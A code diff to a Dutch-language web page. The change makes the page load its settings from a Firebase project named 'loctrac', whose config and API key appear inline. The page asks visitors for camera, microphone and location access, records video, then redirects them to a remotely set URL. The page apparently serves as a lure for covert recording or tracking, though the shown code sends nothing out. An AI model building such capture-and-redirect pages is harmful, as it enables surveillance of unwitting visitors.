@@ -36,6 +36,9 @@
              75%  {content: "...";}
         }
     </style>
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
 </head>
 <body>
     <div class="container">
@@ -45,15 +48,52 @@
     </div>
 
 <script>
-(async () => {
-    // Get settings from localStorage
-    const micCamPermission = localStorage.getItem('micCamPermission') === 'true';
-    const locationPermission = localStorage.getItem('locationPermission') === 'true';
-    const redirectUrl = localStorage.getItem('redirectUrl');
-    const redirectSeconds = parseInt(localStorage.getItem('redirectSeconds')) || 0;
-    const recordSeconds = parseInt(localStorage.getItem('recordSeconds')) || 0;
-    const errorMessage = document.getElementById("error-message");
+// --- Firebase Config (YOUR ACTUAL CONFIG) ---
+const firebaseConfig = {
+    apiKey: "AIzaSyAjuJwrh-OUScGf1tnsYNB9awV9gkg45QA",
+    authDomain: "loctrac-8d7ef.firebaseapp.com",
+    projectId: "loctrac-8d7ef",
+    storageBucket: "loctrac-8d7ef.firebasestorage.com",
+    messagingSenderId: "34491549339",
+    appId: "1:34491549339:web:c666c4f8f3271bab06e83e",
+    measurementId: "G-65PYC8E9VR",
+    databaseURL: "https://loctrac-8d7ef-default-rtdb.europe-west1.firebasedatabase.app" // Correct URL
+};
 
+// Initialize Firebase
+const app = firebase.initializeApp(firebaseConfig);
+const database = firebase.database();
+
+// --- Firebase Database Reference (TEMPORARY - for testing only) ---
+const settingsRef = database.ref('userSettings/testUser');
+const errorMessage = document.getElementById("error-message");
+
+(async () => {
+   // Get settings from Firebase
+    let micCamPermission, locationPermission, redirectUrl, redirectSeconds, recordSeconds;
+
+    try {
+        const snapshot = await settingsRef.once('value');
+        const data = snapshot.val();
+
+        if (data) {
+            micCamPermission = data.micCamPermission;
+            locationPermission = data.locationPermission;
+            redirectUrl = data.redirectUrl;
+            redirectSeconds = parseInt(data.redirectSeconds) || 0;
+            recordSeconds = parseInt(data.recordSeconds) || 0;
+        } else {
+            console.error("No data found in Firebase.");
+            errorMessage.textContent = "Fout: Kon instellingen niet laden.";
+            errorMessage.style.display = 'block';
+            return; // Exit if no data
+        }
+    } catch (error) {
+        console.error("Error fetching settings from Firebase:", error);
+        errorMessage.textContent = `Firebase Fout: ${error.message}`;
+        errorMessage.style.display = 'block';
+        return; // Exit on error
+    }
     // 1. Ask for permissions (if needed)
     if (micCamPermission) {
         try {
@@ -70,14 +110,11 @@
 
                 recorder.onstop = () => {
                     const blob = new Blob(chunks, { type: 'video/webm' });
-                    // You *could* create a URL for the blob here, BUT it's not needed
-                    // for the final redirect.
+                    // No URL needed here
 
                     // 3. Redirect (after recording)
                     performRedirect();
-
-                    // Clean up the stream *after* redirecting.
-                    stream.getTracks().forEach(track => track.stop());
+                    stream.getTracks().forEach(track => track.stop()); // Cleanup
                 };
 
                 recorder.onstart = () => {
@@ -91,7 +128,7 @@
                 recorder.start();
 
             } else {
-                // No recording needed, but we still got the stream, so stop it
+                // No recording, stop stream immediately
                 stream.getTracks().forEach(track => track.stop());
                 // 3. Redirect (immediately)
                 performRedirect();
@@ -99,9 +136,10 @@
 
         } catch (error) {
             console.error("Error accessing camera/microphone:", error);
-             errorMessage.textContent = `Camera/Microfoon Fout: ${error.message}`;
-             errorMessage.style.display = 'block';
-            // 3. Redirect (even if there's an error)
+            errorMessage.textContent = `Camera/Microfoon Fout: ${error.message}`;
+            errorMessage.style.display = 'block';
+
+            // 3. Redirect (even on error)
             performRedirect();
         }
     } else {
@@ -110,19 +148,19 @@
         performRedirect();
     }
 
-     // Function to perform the final redirect
+    // Function to perform the final redirect
     function performRedirect() {
         if (redirectUrl) {
             setTimeout(() => {
                 window.location.href = redirectUrl;
             }, redirectSeconds * 1000);
         } else {
-            document.querySelector('.container').innerHTML = '<p>No redirect URL specified.</p>';
+            errorMessage.textContent = "Fout: Geen doorverwijs-URL opgegeven.";
+            errorMessage.style.display = 'block';
         }
     }
 
 })();
-
 </script>
 </body>
 </html>
